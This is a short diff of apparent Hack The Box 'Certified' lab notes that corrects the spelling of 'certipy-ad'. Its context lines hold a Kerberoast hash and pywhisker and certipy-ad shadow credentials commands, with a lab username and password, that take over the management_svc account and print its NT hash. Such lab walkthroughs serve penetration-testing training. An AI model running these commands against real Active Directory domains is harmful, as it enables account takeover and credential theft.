@@ -27,7 +27,7 @@ $krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$e8f84a59
 
 couldnt crack it - makes me think it was deesigned to be
 
-pywhisker the OG way, ertipy-ad automate the full thing
+pywhisker the OG way, certipy-ad automate the full thing
 pywhisker -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"
 faketime -f '+7h' certipy-ad shadow auto -u judith.mader@certified.htb -p judith09 -account management_svc
 'management_svc': a091c1832bcdd4677c28b5a6a1295584
